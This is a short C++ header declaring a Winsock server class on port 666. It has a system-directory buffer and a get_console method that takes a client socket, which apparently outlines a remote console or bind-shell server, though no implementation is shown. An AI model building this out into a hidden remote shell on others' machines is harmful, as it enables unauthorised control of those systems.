#pragma once
#include <winsock2.h>
#include <iostream>

class Server
{
private:
	static const int buf_sz    = 1024;
	static const int sysdir_sz = 20;
	static const int port = 666;
	char	system_directory[sysdir_sz];
	char	buf_in[buf_sz];
	char	buf_out[buf_sz];
	char	buff[buf_sz];

	SOCKET server_sock;
	SOCKET client_sock;

	int /*DWORD WINAPI*/ handle_connection(LPVOID client_socket);
	void get_console(SOCKET &sock);

public:
	Server();
	~Server();
	void run();
};